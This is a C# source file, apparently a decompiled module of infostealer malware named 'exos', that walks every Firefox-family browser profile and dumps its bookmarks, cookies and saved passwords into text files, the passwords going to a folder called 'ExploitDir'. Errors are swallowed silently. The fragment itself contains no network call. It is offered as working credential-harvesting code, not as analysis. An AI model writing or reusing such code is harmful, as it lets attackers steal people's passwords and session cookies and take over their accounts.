using System.Collections.Generic;
using System.IO;
using exos.Bookmarks;
using exos.Cookies;
using exos.Passwords;

namespace exos.Firefox;

internal class Recovery
{
	public static void Run(string sSavePath)
	{
		string[] sGeckoBrowserPaths = Paths.sGeckoBrowserPaths;
		foreach (string text in sGeckoBrowserPaths)
		{
			try
			{
				string name = new DirectoryInfo(text).Name;
				string text2 = sSavePath + "\\" + name;
				string text3 = Paths.appdata + "\\" + text;
				if (Directory.Exists(text3 + "\\Profiles"))
				{
					Directory.CreateDirectory(text2);
					List<Bookmark> bBookmarks = exos.Bookmarks.Bookmarks.Get(text3);
					List<Cookie> cCookies = exos.Cookies.Cookies.Get(text3);
					List<Password> pPasswords = exos.Passwords.Passwords.Get(text3);
					cBrowserUtils.WriteBookmarks(bBookmarks, text2 + "\\Bookmarks.txt");
					cBrowserUtils.WriteCookies(cCookies, sSavePath + $"\\Cookies_{name}({GenStrings.GenNumbersTo()}).txt");
					cBrowserUtils.WritePasswords(pPasswords, Helper.ExploitDir + "\\Passwords.txt");
				}
			}
			catch
			{
			}
		}
	}
}
